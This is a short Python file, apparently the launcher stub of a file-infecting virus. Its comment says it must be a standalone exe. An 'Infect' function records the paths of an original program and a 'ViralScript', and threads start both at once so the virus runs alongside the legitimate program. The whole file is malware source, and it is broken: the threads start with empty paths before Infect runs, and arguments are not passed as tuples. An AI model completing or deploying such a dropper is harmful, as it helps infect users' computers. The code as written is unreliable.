import threading                # Note that this file must be a stand alone exe
import os
from shutil import move

OrgExePath = ""
VirusExePath = ""

def RunFile(exepath):
    os.startfile(exepath)

def Infect(OrgExePatharg, VirusExePatharg):
    global OrgExePath
    global VirusExePath
    OrgExePath = OrgExePatharg
    VirusExePath = VirusExePatharg

orgfile = threading.Thread(target=RunFile, args=(OrgExePath))
ViralScript = threading.Thread(target=RunFile, args=(VirusExePath))
orgfile.start()
ViralScript.start()